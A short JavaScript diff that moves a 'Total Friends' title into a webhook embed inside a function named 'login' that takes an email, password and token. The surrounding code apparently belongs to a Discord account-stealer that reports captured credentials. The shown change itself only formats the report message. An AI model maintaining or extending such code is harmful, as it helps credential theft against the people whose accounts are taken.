@@ -605,7 +605,6 @@ const login = async (email, password, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
-    title: `Total Friends (${friends})`,
     embeds: [
       {
         color: config.embed_color,
@@ -666,6 +665,8 @@ const login = async (email, password, token) => {
         thumbnail: {
           url: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
         },
+        title: `Total Friends (${friends})`,
+
       },
     ],
   };
